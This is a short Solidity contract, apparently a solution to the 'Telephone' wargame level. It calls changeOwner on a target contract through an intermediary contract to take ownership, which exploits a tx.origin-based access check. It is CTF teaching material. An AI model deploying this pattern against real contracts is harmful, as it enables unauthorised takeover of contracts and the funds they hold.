// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address __owner) external;
}

contract TelephoneAttack {
    ITelephone public challenge;

    constructor(address _challengeAddress) public {
        challenge = ITelephone(_challengeAddress);
    }

    function attack(address _owner) public {
        challenge.changeOwner(_owner);
    }
}